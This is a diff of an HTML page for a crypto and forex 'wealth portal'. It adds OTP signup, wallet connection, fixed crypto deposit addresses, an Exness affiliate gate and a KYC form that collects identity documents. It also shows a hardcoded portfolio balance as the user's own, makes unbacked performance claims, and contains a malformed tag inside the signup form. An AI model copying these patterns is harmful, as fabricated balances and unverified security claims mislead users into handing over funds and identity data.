@@ -2,10 +2,21 @@
 <html lang="en" class="scroll-smooth">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width,initial-scale=1.0">
+  <meta name="viewport" content="width=device-width,initial-scale=1.0,viewport-fit=cover">
   <meta name="description" content="AL-MUDIR private wealth and fintech portal.">
   <meta name="theme-color" content="#04120f">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="mobile-web-app-capable" content="yes">
   <title>AL-MUDIR | Private Wealth & Fintech Ventures</title>
+  <link rel="manifest" href="/manifest.json">
+
+  <script>
+    window.va = window.va || function () {
+      (window.vaq = window.vaq || []).push(arguments);
+    };
+  </script>
+  <script defer src="/_vercel/insights/script.js" data-sdkn="@vercel/analytics" data-sdkv="2.0.1"></script>
 
   <script src="https://cdn.tailwindcss.com"></script>
   <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@400;600;700&family=Lato:wght@300;400;500;700&family=Courier+Prime:wght@400;700&display=swap" rel="stylesheet">
@@ -18,10 +29,10 @@
       --text: #e8e0d0;
       --gold: #d4af37;
       --gold-soft: #f2d06b;
-      --okx-black: #090909;
-      --okx-card: #141414;
-      --okx-border: #2b2b2b;
-      --okx-orange: #ff7a00;
+      --dash-bg: #050606;
+      --dash-card: #0e1114;
+      --dash-border: #242a31;
+      --dash-accent: #b4f731;
     }
 
     * { box-sizing: border-box; }
@@ -72,30 +83,118 @@
       background: rgba(212, 175, 55, 0.1);
     }
 
-    .okx-shell {
+    .dash-shell {
       background: linear-gradient(180deg, #0d0d0d 0%, #080808 100%);
-      border: 1px solid var(--okx-border);
+      border: 1px solid var(--dash-border);
       box-shadow: 0 24px 60px rgba(0, 0, 0, 0.35);
     }
 
-    .okx-card {
-      background: var(--okx-card);
-      border: 1px solid var(--okx-border);
+    .dash-card {
+      background: var(--dash-card);
+      border: 1px solid var(--dash-border);
     }
 
-    .okx-pill {
+    .dash-pill {
       border: 1px solid #3c3c3c;
       color: #d6d6d6;
       background: #111;
     }
 
-    .okx-accent {
-      color: var(--okx-orange);
+    .dash-accent {
+      color: var(--dash-accent);
+    }
+
+    .dash-nav-btn {
+      border: 1px solid #2f3741;
+      background: #101418;
+      color: #cfd4db;
+      transition: all 0.2s ease;
+    }
+
+    .dash-nav-btn.active,
+    .dash-nav-btn:hover {
+      border-color: var(--dash-accent);
+      color: var(--dash-accent);
+    }
+
+    .dash-mobile-nav {
+      background: rgba(5, 6, 8, 0.94);
+      border-top: 1px solid var(--dash-border);
+      backdrop-filter: blur(8px);
+      box-shadow: 0 -10px 25px rgba(0, 0, 0, 0.3);
+      padding-bottom: calc(0.5rem + env(safe-area-inset-bottom));
+    }
+
+    .dash-mobile-nav-btn {
+      border: 1px solid transparent;
+      color: #aeb6bf;
+      transition: all 0.2s ease;
+    }
+
+    .dash-mobile-nav-btn.active {
+      border-color: rgba(180, 247, 49, 0.35);
+      background: rgba(180, 247, 49, 0.08);
+      color: var(--dash-accent);
+    }
+
+    .wallet-quick-btn {
+      border: 1px solid #2f3741;
+      background: #0f1317;
+      color: #d9e0e8;
+    }
+
+    .wallet-quick-btn:hover {
+      border-color: var(--dash-accent);
+      color: var(--dash-accent);
     }
 
     .hidden { display: none; }
     input::placeholder, textarea::placeholder { color: #77837d; font-size: 0.8rem; letter-spacing: 0.1em; }
     input, textarea, select { color: var(--text); }
+
+    /* ── Cross-device / responsive fixes ─────────────────────────────── */
+    html { -webkit-text-size-adjust: 100%; }
+    body { overscroll-behavior-y: contain; }
+
+    /* Remove 300 ms tap delay on touch devices */
+    button, a, input, select, textarea { touch-action: manipulation; }
+
+    /* iOS Safari zooms on focus when font-size < 16 px — prevent it */
+    @media screen and (max-width: 1023px) {
+      input[type="text"],
+      input[type="email"],
+      input[type="password"],
+      input[type="number"],
+      input[type="date"],
+      select { font-size: 16px; }
+    }
+
+    /* WCAG 2.5.5 — minimum 44 px touch targets on touch screens */
+    @media screen and (max-width: 1023px) {
+      button { min-height: 44px; }
+    }
+
+    /* Responsive public execution terminal */
+    .chart-public { height: 300px; }
+    @media screen and (min-width: 640px)  { .chart-public { height: 440px; } }
+    @media screen and (min-width: 1024px) { .chart-public { height: 580px; } }
+
+    /* Crypto address overflow on narrow screens */
+    .addr-wrap {
+      word-break: break-all;
+      font-family: 'Courier Prime', monospace;
+      font-size: 0.68rem;
+      line-height: 1.5;
+    }
+
+    /* Scroll offset so fixed nav doesn't obscure dashboard after login */
+    #dashboard { scroll-margin-top: 80px; }
+
+    /* Date-picker colour on dark backgrounds */
+    input[type="date"] { color-scheme: dark; }
+
+    /* Smooth momentum scrolling on iOS */
+    * { -webkit-overflow-scrolling: touch; }
   </style>
 </head>
 <body>
@@ -114,7 +213,7 @@
   <section class="min-h-screen px-6 pt-28 pb-16 text-center flex items-center justify-center">
     <div class="max-w-4xl">
       <p class="text-xs uppercase tracking-[0.35em] text-gray-400">Sovereign Wealth and Fintech Innovation</p>
-      <h1 class="serif mt-6 text-5xl leading-tight md:text-8xl text-gold-gradient">Preserving Capital.<br><span class="text-white">Architecting Alpha.</span></h1>
+      <h1 class="serif mt-6 text-3xl leading-tight sm:text-5xl md:text-6xl lg:text-8xl text-gold-gradient">Preserving Capital.<br><span class="text-white">Architecting Alpha.</span></h1>
       <p class="mx-auto mt-8 max-w-2xl text-gray-300">Institutional-grade management with seven-figure AUM and precision execution across macro and digital markets.</p>
       <div class="mt-10 flex flex-col justify-center gap-4 md:flex-row">
         <a href="#portalAuth" class="btn-gold rounded px-10 py-4 text-sm">Join Now</a>
@@ -124,7 +223,7 @@
   </section>
 
   <section id="metrics" class="bg-[#061d18] px-6 py-20">
-    <div class="mx-auto grid max-w-6xl gap-6 md:grid-cols-4">
+    <div class="mx-auto grid max-w-6xl gap-4 grid-cols-2 md:grid-cols-4">
       <div class="glass rounded-lg p-7 text-center"><p class="text-xs uppercase text-gray-400">Total AUM</p><p class="serif mt-2 text-3xl text-white">$7.8M+</p></div>
       <div class="glass rounded-lg p-7 text-center"><p class="text-xs uppercase text-gray-400">Sharpe Ratio</p><p class="serif mt-2 text-3xl text-white">2.84</p></div>
       <div class="glass rounded-lg p-7 text-center"><p class="text-xs uppercase text-gray-400">Max Drawdown</p><p class="serif mt-2 text-3xl text-white">-3.2%</p></div>
@@ -136,7 +235,7 @@
     <div class="mx-auto grid max-w-6xl gap-10 md:grid-cols-2">
       <div>
         <p class="text-xs uppercase tracking-[0.28em] text-gray-500">The Manager</p>
-        <h2 class="serif mt-4 text-4xl text-gold-gradient">Stewardship of Generational Wealth</h2>
+        <h2 class="serif mt-4 text-3xl md:text-4xl text-gold-gradient">Stewardship of Generational Wealth</h2>
         <p class="mt-6 text-gray-300">AL-MUDIR operates at the intersection of capital preservation and fintech execution, with disciplined risk controls and asymmetric strategies.</p>
       </div>
       <div class="space-y-4">
@@ -153,7 +252,7 @@
         <h2 class="serif text-4xl text-gold-gradient">Execution Terminal</h2>
         <p class="mono mt-3 text-xs uppercase tracking-[0.22em] text-gray-400">Latency 0.04ms | Institutional Feed</p>
       </div>
-      <div class="glass rounded-xl p-2" style="height:580px;">
+      <div class="chart-public glass rounded-xl p-2">
         <div id="tradingview_pro" style="height:100%;width:100%;"></div>
       </div>
     </div>
@@ -178,8 +277,24 @@
             <input id="signupEmail" required maxlength="120" autocomplete="email" type="email" placeholder="EMAIL ADDRESS" class="w-full border-b border-gold/40 bg-transparent py-3">
             <input id="signupPassword" required minlength="8" maxlength="72" autocomplete="new-password" type="password" placeholder="PASSWORD (MIN 8 CHARACTERS)" class="w-full border-b border-gold/40 bg-transparent py-3">
             <input id="signupConfirm" required minlength="8" maxlength="72" autocomplete="new-password" type="password" placeholder="CONFIRM PASSWORD" class="w-full border-b border-gold/40 bg-transparent py-3">
-            <button class="btn-gold w-full rounded py-3 text-xs" type="submit">Create Account</button>
+            <input id="signupPhone" maxlength="20" autocomplete="tel" type="tel" placeholder="PHONE NUMBER (OPTIONAL)" class="w-full border-b border-gold/40 bg-transparent py-3">
+            <button class="btn-gold w-full rounded py-3 text-xs" type="submit">Create Account &amp; Send Code</button>
             <p id="signupStatus" class="hidden text-center text-xs"></p>
+                <div id="otpArea" class="hidden max-w-md mx-auto w-full glass rounded-xl p-6">
+                  <p class="text-xs uppercase tracking-[0.2em] text-gray-400">Email Verification</p>
+                  <p class="mt-3 text-sm text-gray-300">A 6-digit code was sent to <span id="otpEmailDisplay" class="text-white font-semibold">your email</span>. Check your inbox.</p>
+                  <div class="mt-6 space-y-4">
+                    <input id="otpCode" type="text" maxlength="6" inputmode="numeric" autocomplete="one-time-code" placeholder="0  0  0  0  0  0" class="w-full text-center text-2xl tracking-[0.5em] border-b border-gold/40 bg-transparent py-4 font-mono">
+                    <button id="verifyOtpBtn" class="btn-gold w-full rounded py-3 text-xs">Verify &amp; Enter Dashboard</button>
+                    <div class="flex justify-between">
+                      <button id="resendOtpBtn" type="button" class="text-xs text-gray-400 hover:text-white underline">Resend code</button>
+                      <button id="backToAuthBtn" type="button" class="text-xs text-gray-500 hover:text-white">&#8592; Back to login</button>
+                    </div>
+                    <p id="otpStatus" class="hidden text-center text-xs"></p>
+                  </div>
+                </div>
+
+                <section id="dashboard"
           </form>
         </div>
 
@@ -194,42 +309,68 @@
         </div>
       </div>
 
-      <section id="dashboard" class="okx-shell hidden rounded-2xl p-5 md:p-7">
-        <div class="grid gap-6 lg:grid-cols-[240px_1fr]">
-          <aside class="okx-card rounded-xl p-5">
-            <p class="text-[11px] uppercase tracking-[0.2em] text-gray-400">Account</p>
+      <section id="dashboard" class="dash-shell hidden rounded-2xl p-4 pb-24 sm:p-5 lg:p-7 lg:pb-7">
+        <div class="grid gap-6 lg:grid-cols-[250px_1fr]">
+          <aside class="dash-card rounded-xl p-5">
+            <p class="text-[11px] uppercase tracking-[0.2em] text-gray-400">Client Profile</p>
             <h4 id="dashName" class="mt-3 text-lg font-semibold text-white">Client</h4>
             <p id="dashEmail" class="mt-1 text-xs text-gray-400">-</p>
-            <div class="mt-5 space-y-2">
-              <div class="okx-pill rounded px-3 py-2 text-xs">Overview</div>
-              <div class="okx-pill rounded px-3 py-2 text-xs">Free Access</div>
-              <div class="okx-pill rounded px-3 py-2 text-xs">Crypto Payment</div>
+            <p id="dashUserId" class="mt-1 text-[11px] text-gray-500">User ID: -</p>
+            <p id="kycSidebarBadge" class="mt-1 text-[10px] text-red-400">Unverified</p>
+            <p id="dashWallet" class="mt-1 text-xs text-gray-500">Wallet: Not connected</p>
+            <div class="mt-5 hidden space-y-2 lg:block">
+              <button data-panel="home" class="dash-nav-btn active dashboard-nav-btn w-full rounded px-3 py-2 text-left text-xs">Home</button>
+              <button data-panel="trade" class="dash-nav-btn dashboard-nav-btn w-full rounded px-3 py-2 text-left text-xs">Trade</button>
+              <button data-panel="deposit" class="dash-nav-btn dashboard-nav-btn w-full rounded px-3 py-2 text-left text-xs">Deposit</button>
+              <button data-panel="profile" class="dash-nav-btn dashboard-nav-btn w-full rounded px-3 py-2 text-left text-xs">Profile</button>
             </div>
             <button id="logoutBtn" class="mt-6 w-full rounded border border-red-500/50 px-3 py-2 text-xs text-red-300 hover:bg-red-500/10">Log out</button>
           </aside>
 
           <main class="space-y-6">
-            <div class="okx-card rounded-xl p-5">
-              <p class="text-[11px] uppercase tracking-[0.2em] text-gray-400">OKX-style Quick Actions</p>
-              <h5 class="mt-2 text-xl text-white">Your Dashboard</h5>
-              <p class="mt-2 text-sm text-gray-400">Free Access and Crypto Payment are available only inside your account dashboard.</p>
+            <div class="dash-card rounded-xl p-5">
+              <p class="text-[11px] uppercase tracking-[0.2em] text-gray-400">Welcome Back</p>
+              <h5 class="mt-2 text-xl text-white">Your Portfolio Dashboard</h5>
+              <p class="mt-2 text-sm text-gray-400">Manage trading, funding, and profile settings from one secure workspace.</p>
             </div>
 
-            <div class="grid gap-6 md:grid-cols-2">
-              <div class="okx-card rounded-xl p-5">
-                <p class="text-[11px] uppercase tracking-[0.2em] text-gray-400">Free Access</p>
-                <h6 class="mt-2 text-lg text-white">Activate Starter Access</h6>
-                <p class="mt-2 text-sm text-gray-400">Unlock market snapshots and educational briefings.</p>
-                <button id="freeAccessBtn" class="mt-4 w-full rounded bg-[#1f1f1f] py-3 text-xs uppercase tracking-[0.16em] text-white border border-[#3a3a3a] hover:border-[var(--okx-orange)] hover:text-[var(--okx-orange)]">Request Free Access</button>
-                <p id="freeStatus" class="hidden mt-3 text-center text-xs"></p>
-              </div>
+            <section id="panelHome" class="dashboard-panel space-y-6">
+              <div class="grid gap-4 lg:grid-cols-[1.2fr_1fr]">
+                <div class="dash-card rounded-xl p-5">
+                  <p class="text-[11px] uppercase tracking-[0.2em] text-gray-400">Portfolio Snapshot</p>
+                  <p class="mt-2 text-4xl font-semibold text-white">$<span id="portfolioValue">6,389.61</span></p>
+                  <p class="mt-1 text-sm dash-accent">+$100.24 (0.4%) this week</p>
+                  <div class="mt-6 grid grid-cols-2 gap-3">
+                    <button class="wallet-quick-btn rounded py-2 text-xs">Send</button>
+                    <button class="wallet-quick-btn rounded py-2 text-xs">Receive</button>
+                    <button class="wallet-quick-btn rounded py-2 text-xs">History</button>
+                    <button class="wallet-quick-btn rounded py-2 text-xs">More</button>
+                  </div>
+                    <div class="mt-5 space-y-2">
+                      <p class="text-[10px] uppercase tracking-[0.15em] text-gray-500">Verify User ID before Free Access</p>
+                    <p class="text-[10px] uppercase tracking-[0.15em] text-gray-500">Enter Exness Client ID to Verify</p>
+                      <input id="freeUserId" type="text" maxlength="60" placeholder="Your Exness Client ID" class="w-full rounded border border-[#2f3741] bg-[#0f1317] px-3 py-2 text-xs">
+                    </div>
+                    <button id="freeAccessBtn" class="mt-3 w-full rounded bg-[#1f1f1f] py-3 text-xs uppercase tracking-[0.16em] text-white border border-[#3a3a3a] hover:border-[var(--dash-accent)] hover:text-[var(--dash-accent)]">Request Free Access Link</button>
+                  <p id="freeStatus" class="hidden mt-3 text-center text-xs"></p>
+                </div>
 
-              <div class="okx-card rounded-xl p-5">
-                <p class="text-[11px] uppercase tracking-[0.2em] text-gray-400">Crypto Payment</p>
-                <h6 class="mt-2 text-lg text-white">Funding Desk</h6>
-                <div class="mt-4 grid grid-cols-3 gap-2">
-                  <input id="payAmount" type="number" min="1" step="0.01" placeholder="Amount" class="col-span-1 border-b border-gray-600 bg-transparent py-2 text-sm">
-                  <select id="payFrom" class="col-span-1 border-b border-gray-600 bg-transparent py-2 text-sm">
+                <div class="dash-card rounded-xl p-4">
+                  <p class="text-[11px] uppercase tracking-[0.2em] text-gray-400">Execution Terminal (XAUUSD)</p>
+                  <div class="mt-3 rounded border border-white/10 p-2" style="height:280px;">
+                    <div id="tradingview_dashboard_xau" style="height:100%;width:100%;"></div>
+                  </div>
+                </div>
+              </div>
+            </section>
+
+            <section id="panelTrade" class="dashboard-panel hidden">
+              <div class="dash-card rounded-xl p-5">
+                <p class="text-[11px] uppercase tracking-[0.2em] text-gray-400">Trade</p>
+                <h6 class="mt-2 text-lg text-white">Convert and Submit Payment</h6>
+                <div class="mt-4 grid grid-cols-1 gap-3 sm:grid-cols-3">
+                  <input id="payAmount" type="number" min="1" step="0.01" placeholder="Amount" class="border-b border-gray-600 bg-transparent py-2 text-sm">
+                  <select id="payFrom" class="border-b border-gray-600 bg-transparent py-2 text-sm">
                     <option value="USD" class="text-black">USD</option>
                     <option value="EUR" class="text-black">EUR</option>
                     <option value="GBP" class="text-black">GBP</option>
@@ -237,23 +378,201 @@
                     <option value="ETH" class="text-black">ETH</option>
                     <option value="USDT" class="text-black">USDT</option>
                   </select>
-                  <select id="payTo" class="col-span-1 border-b border-gray-600 bg-transparent py-2 text-sm">
-                    <option value="USDT" class="text-black">USDT</option>
+                  <select id="payTo" class="border-b border-gray-600 bg-transparent py-2 text-sm">
                     <option value="ETH" class="text-black">ETH</option>
                     <option value="BNB" class="text-black">BNB</option>
                   </select>
                 </div>
-                <button id="convertBtn" class="mt-4 w-full rounded border border-[#3a3a3a] py-2 text-xs uppercase tracking-[0.14em] hover:border-[var(--okx-orange)]">Convert</button>
+                <button id="convertBtn" class="mt-4 w-full rounded border border-[#3a3a3a] py-2 text-xs uppercase tracking-[0.14em] hover:border-[var(--dash-accent)] hover:text-[var(--dash-accent)]">Convert</button>
                 <p id="convertStatus" class="mt-3 text-center text-xs text-gray-400">Ready.</p>
-                <div class="mt-3 grid grid-cols-2 gap-2">
-                  <button id="connectWalletBtn" class="rounded border border-[#3a3a3a] py-2 text-[11px] uppercase tracking-[0.14em]">Connect Wallet</button>
-                  <button id="payNowBtn" class="rounded bg-[var(--okx-orange)] py-2 text-[11px] font-semibold uppercase tracking-[0.14em] text-black">Pay Now</button>
-                </div>
+                <button id="payNowBtn" class="mt-3 w-full rounded bg-[var(--dash-accent)] py-2 text-[11px] font-semibold uppercase tracking-[0.14em] text-black">Pay Now</button>
                 <p id="paymentStatus" class="hidden mt-3 text-center text-xs"></p>
               </div>
-            </div>
+            </section>
+
+            <section id="panelDeposit" class="dashboard-panel hidden">
+              <div class="dash-card rounded-xl p-5 space-y-4">
+                <p class="text-[11px] uppercase tracking-[0.2em] text-gray-400">Deposit & Wallet</p>
+                <h6 class="text-lg text-white">Connect Wallet and Fund Account</h6>
+
+                <div class="grid gap-3 sm:grid-cols-2">
+                  <select id="walletType" class="rounded border border-[#2f3741] bg-[#0f1317] px-3 py-2 text-sm">
+                    <option value="auto" class="text-black">Auto detect wallet</option>
+                    <option value="metamask" class="text-black">MetaMask</option>
+                    <option value="trustwallet" class="text-black">Trust Wallet</option>
+                    <option value="coinbase" class="text-black">Coinbase Wallet</option>
+                    <option value="binance" class="text-black">Binance Wallet</option>
+                    <option value="walletconnect" class="text-black">Any WalletConnect compatible wallet</option>
+                  </select>
+                  <button id="connectWalletBtn" class="rounded border border-[#3a3a3a] py-2 text-[11px] uppercase tracking-[0.14em] hover:border-[var(--dash-accent)] hover:text-[var(--dash-accent)]">Connect Wallet</button>
+                </div>
+
+                <div class="rounded border border-white/10 bg-black/20 p-4 space-y-3">
+                  <div>
+                    <p class="text-[10px] uppercase tracking-[0.15em] text-gray-500">BTC</p>
+                    <span id="addrBtc" class="addr-wrap text-gray-300">bc1qfe8kjaau2n2ggknmx6a8gclzwc9xz3zpj0lcsp</span>
+                  </div>
+                  <div>
+                    <p class="text-[10px] uppercase tracking-[0.15em] text-gray-500">USDT ERC-20</p>
+                    <span id="addrUsdtErc" class="addr-wrap text-gray-300">0x3b8BAdeCEbB98258F27405a8Dff37e2308AB6E20</span>
+                  </div>
+                  <div>
+                    <p class="text-[10px] uppercase tracking-[0.15em] text-gray-500">USDT TRC-20</p>
+                    <span id="addrUsdtTrc" class="addr-wrap text-gray-300">TLNNQNDsH6JG9dxd99Tqfkb8eSPRUyhC4E</span>
+                  </div>
+                </div>
+
+                <div id="walletFallbackCard" class="hidden rounded border border-white/10 bg-[#0f1317] p-4 space-y-4">
+                  <div>
+                    <p class="text-[11px] uppercase tracking-[0.18em] text-gray-400">No Extension?</p>
+                    <h6 id="walletFallbackTitle" class="mt-2 text-base text-white">Continue in your wallet app</h6>
+                    <p id="walletFallbackMessage" class="mt-2 text-xs text-gray-400">Open this site inside a wallet app browser, or scan the QR code with your phone.</p>
+                  </div>
+
+                  <div class="grid gap-3 sm:grid-cols-2">
+                    <button id="walletOpenSelectedBtn" class="rounded border border-[#3a3a3a] py-2 text-[11px] uppercase tracking-[0.14em] hover:border-[var(--dash-accent)] hover:text-[var(--dash-accent)]">Open Selected Wallet App</button>
+                    <button id="walletCopyLinkBtn" class="rounded border border-[#3a3a3a] py-2 text-[11px] uppercase tracking-[0.14em] hover:border-[var(--dash-accent)] hover:text-[var(--dash-accent)]">Copy Site Link</button>
+                  </div>
+
+                  <div class="grid gap-2 sm:grid-cols-3">
+                    <button data-wallet-app="metamask" class="wallet-app-btn rounded border border-[#2f3741] py-2 text-[11px] uppercase tracking-[0.12em] hover:border-[var(--dash-accent)] hover:text-[var(--dash-accent)]">MetaMask App</button>
+                    <button data-wallet-app="trustwallet" class="wallet-app-btn rounded border border-[#2f3741] py-2 text-[11px] uppercase tracking-[0.12em] hover:border-[var(--dash-accent)] hover:text-[var(--dash-accent)]">Trust Wallet</button>
+                    <button data-wallet-app="coinbase" class="wallet-app-btn rounded border border-[#2f3741] py-2 text-[11px] uppercase tracking-[0.12em] hover:border-[var(--dash-accent)] hover:text-[var(--dash-accent)]">Coinbase App</button>
+                  </div>
+
+                  <div class="rounded border border-white/10 bg-black/20 p-4 text-center">
+                    <p class="text-[10px] uppercase tracking-[0.15em] text-gray-500">Scan On Phone</p>
+                    <div id="walletQrCode" class="mx-auto mt-3 flex min-h-[172px] items-center justify-center"></div>
+                  </div>
+                </div>
+                <p id="walletStatus" class="text-center text-xs text-gray-400">No wallet connected.</p>
+              </div>
+            </section>
+
+            <section id="panelProfile" class="dashboard-panel hidden space-y-5">
+              <div class="dash-card rounded-xl p-5 space-y-4">
+                <p class="text-[11px] uppercase tracking-[0.2em] text-gray-400">Profile</p>
+                <h6 class="text-lg text-white">User Profile</h6>
+                <div class="grid gap-3 md:grid-cols-2">
+                  <div>
+                    <p class="text-[11px] uppercase tracking-[0.15em] text-gray-500">Full Name</p>
+                    <input id="profileName" type="text" maxlength="80" class="mt-2 w-full rounded border border-[#2f3741] bg-[#0f1317] px-3 py-2 text-sm" placeholder="Update your name">
+                  </div>
+                  <div>
+                    <p class="text-[11px] uppercase tracking-[0.15em] text-gray-500">Email</p>
+                    <input id="profileEmail" type="email" readonly class="mt-2 w-full rounded border border-[#2f3741] bg-[#0a0d10] px-3 py-2 text-sm text-gray-400">
+                  </div>
+                </div>
+                <div>
+                  <p class="text-[11px] uppercase tracking-[0.15em] text-gray-500">User ID</p>
+                  <input id="profileUserId" type="text" readonly class="mt-2 w-full rounded border border-[#2f3741] bg-[#0a0d10] px-3 py-2 text-sm text-gray-400">
+                </div>
+                <button id="saveProfileBtn" class="w-full rounded border border-[#3a3a3a] py-2 text-[11px] uppercase tracking-[0.14em] hover:border-[var(--dash-accent)] hover:text-[var(--dash-accent)]">Save Profile</button>
+                <p id="profileStatus" class="hidden text-center text-xs"></p>
+              </div>
+
+              <div class="dash-card rounded-xl p-5 space-y-4">
+                <p class="text-[11px] uppercase tracking-[0.2em] text-gray-400">Broker Signup Verification</p>
+                <p class="text-xs text-gray-400">Complete broker signup once. Free access link requests are accepted only after successful broker signup and User ID verification.</p>
+                <a href="https://one.exnessonelink.com/a/aczb4cfol7" target="_blank" rel="noopener noreferrer" class="block w-full rounded border border-[#3a3a3a] py-2 text-center text-[11px] uppercase tracking-[0.14em] hover:border-[var(--dash-accent)] hover:text-[var(--dash-accent)]">Open Official Broker Partnership Link</a>
+                <div class="grid gap-3 md:grid-cols-2">
+                  <div>
+                    <p class="text-[11px] uppercase tracking-[0.15em] text-gray-500">Broker Name</p>
+                    <input id="brokerName" type="text" maxlength="80" placeholder="e.g. Exness" class="mt-2 w-full rounded border border-[#2f3741] bg-[#0f1317] px-3 py-2 text-sm">
+                  </div>
+                  <div>
+                    <p class="text-[11px] uppercase tracking-[0.15em] text-gray-500">Broker Account ID</p>
+                      <p class="text-[10px] text-gray-600 mt-1">Get this from Exness after signing up — it becomes your permanent AL-MUDIR Client ID.</p>
+                      <input id="brokerAccountId" type="text" maxlength="60" placeholder="e.g. 12345678 (from Exness)" class="mt-2 w-full rounded border border-[#2f3741] bg-[#0f1317] px-3 py-2 text-sm">
+                  </div>
+                </div>
+                <button id="completeBrokerSignupBtn" class="w-full rounded border border-[#3a3a3a] py-2 text-[11px] uppercase tracking-[0.14em] hover:border-[var(--dash-accent)] hover:text-[var(--dash-accent)]">Complete Broker Signup</button>
+                <p id="brokerSignupStatus" class="hidden text-center text-xs"></p>
+              </div>
+
+              <!-- Identity Verification (KYC) -->
+              <div class="dash-card rounded-xl p-5 space-y-4">
+                <div class="flex items-center justify-between">
+                  <p class="text-[11px] uppercase tracking-[0.2em] text-gray-400">Identity Verification</p>
+                  <span id="kycBadge" class="rounded-full border border-red-500/30 bg-red-500/10 px-3 py-1 text-[10px] uppercase tracking-[0.12em] font-semibold text-red-400">Unverified</span>
+                </div>
+                <p class="text-xs text-gray-400">Verification unlocks higher funding limits and full trading access. All data is encrypted and stored securely.</p>
+
+                <div id="kycForm" class="space-y-4">
+                  <div class="grid gap-3 md:grid-cols-2">
+                    <div>
+                      <p class="text-[11px] uppercase tracking-[0.15em] text-gray-500">Date of Birth</p>
+                      <input id="kycDob" type="date" class="mt-2 w-full rounded border border-[#2f3741] bg-[#0f1317] px-3 py-2 text-sm">
+                    </div>
+                    <div>
+                      <p class="text-[11px] uppercase tracking-[0.15em] text-gray-500">Country of Residence</p>
+                      <input id="kycCountry" type="text" maxlength="60" placeholder="e.g. United Arab Emirates" class="mt-2 w-full rounded border border-[#2f3741] bg-[#0f1317] px-3 py-2 text-sm">
+                    </div>
+                  </div>
+                  <div class="grid gap-3 md:grid-cols-2">
+                    <div>
+                      <p class="text-[11px] uppercase tracking-[0.15em] text-gray-500">ID Type</p>
+                      <select id="kycIdType" class="mt-2 w-full rounded border border-[#2f3741] bg-[#0f1317] px-3 py-2 text-sm">
+                        <option value="" class="text-black">Select document type...</option>
+                        <option value="passport" class="text-black">Passport</option>
+                        <option value="national_id" class="text-black">National ID Card</option>
+                        <option value="drivers_license" class="text-black">Driver's License</option>
+                      </select>
+                    </div>
+                    <div>
+                      <p class="text-[11px] uppercase tracking-[0.15em] text-gray-500">Document Number</p>
+                      <input id="kycDocNumber" type="text" maxlength="40" placeholder="e.g. A12345678" class="mt-2 w-full rounded border border-[#2f3741] bg-[#0f1317] px-3 py-2 text-sm">
+                    </div>
+                  </div>
+                  <div>
+                    <p class="text-[11px] uppercase tracking-[0.15em] text-gray-500">Verification Document</p>
+                    <input id="kycDocument" type="file" accept="image/png,image/jpeg,image/webp,application/pdf" class="mt-2 block w-full rounded border border-[#2f3741] bg-[#0f1317] px-3 py-2 text-sm file:mr-3 file:rounded file:border-0 file:bg-[var(--dash-accent)] file:px-3 file:py-2 file:text-xs file:font-semibold file:text-black">
+                    <p id="kycDocumentMeta" class="mt-2 text-[11px] text-gray-500">Accepted: PNG, JPG, WEBP, PDF up to 2 MB.</p>
+                  </div>
+                  <div class="rounded border border-white/10 bg-black/20 p-3 text-xs text-gray-400">
+                    <p class="font-semibold text-white">Auto Verifier</p>
+                    <p class="mt-1">The automated verifier checks file type, size, age, document number format, and submission completeness before deciding the result instantly.</p>
+                  </div>
+                  <button id="submitKycBtn" class="w-full rounded bg-[var(--dash-accent)] py-2 text-[11px] font-semibold uppercase tracking-[0.14em] text-black hover:opacity-90">Submit for Verification</button>
+                  <p id="kycStatus" class="hidden text-center text-xs"></p>
+                </div>
+
+                <div id="kycPending" class="hidden rounded border border-yellow-500/30 bg-yellow-500/5 p-4 text-center space-y-2">
+                  <i class="fa-solid fa-clock-rotate-left text-yellow-400 text-base"></i>
+                  <p class="text-xs font-semibold text-yellow-300">Verification Pending</p>
+                  <p class="text-xs text-gray-400">Your documents are under review. You will be notified once approved.</p>
+                </div>
+
+                <div id="kycVerified" class="hidden rounded border border-[var(--dash-accent)]/30 bg-[var(--dash-accent)]/5 p-4 text-center space-y-2">
+                  <i class="fa-solid fa-shield-halved text-[var(--dash-accent)] text-base"></i>
+                  <p class="text-xs font-semibold text-[var(--dash-accent)]">Identity Verified</p>
+                  <p class="text-xs text-gray-400">Your account is fully verified and all features are unlocked.</p>
+                </div>
+              </div>
+            </section>
           </main>
         </div>
+
+        <nav class="dash-mobile-nav fixed inset-x-0 bottom-0 z-40 lg:hidden">
+          <div class="mx-auto grid max-w-6xl grid-cols-4 gap-2 px-4 pt-3">
+            <button data-panel="home" class="dash-mobile-nav-btn dashboard-nav-btn active flex flex-col items-center rounded-lg py-2 text-[10px] uppercase tracking-[0.08em]">
+              <i class="fa-solid fa-house text-sm"></i>
+              <span class="mt-1">Home</span>
+            </button>
+            <button data-panel="trade" class="dash-mobile-nav-btn dashboard-nav-btn flex flex-col items-center rounded-lg py-2 text-[10px] uppercase tracking-[0.08em]">
+              <i class="fa-solid fa-chart-line text-sm"></i>
+              <span class="mt-1">Trade</span>
+            </button>
+            <button data-panel="deposit" class="dash-mobile-nav-btn dashboard-nav-btn flex flex-col items-center rounded-lg py-2 text-[10px] uppercase tracking-[0.08em]">
+              <i class="fa-solid fa-wallet text-sm"></i>
+              <span class="mt-1">Deposit</span>
+            </button>
+            <button data-panel="profile" class="dash-mobile-nav-btn dashboard-nav-btn flex flex-col items-center rounded-lg py-2 text-[10px] uppercase tracking-[0.08em]">
+              <i class="fa-solid fa-user text-sm"></i>
+              <span class="mt-1">Profile</span>
+            </button>
+          </div>
+        </nav>
       </section>
     </div>
   </section>
@@ -262,13 +581,21 @@
     Copyright 2026 AL-MUDIR Wealth and Fintech Ventures
   </footer>
 
-  <script src="https://s3.tradingview.com/tv.js"></script>
+  <script src="https://s3.tradingview.com/tv.js" onload="initPublicChart()"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
   <script src="/crypto-payment.js"></script>
   <script>
-    const USERS_KEY = 'alm_users_v1';
-    const SESSION_KEY = 'alm_session_v1';
+    const SESSION_KEY = 'alm_session_v3';
+    const BROKER_PARTNERSHIP_LINK = 'https://one.exnessonelink.com/a/aczb4cfol7';
 
     const signupForm = document.getElementById('signupForm');
+      const otpArea = document.getElementById('otpArea');
+      const otpCode = document.getElementById('otpCode');
+      const otpEmailDisplay = document.getElementById('otpEmailDisplay');
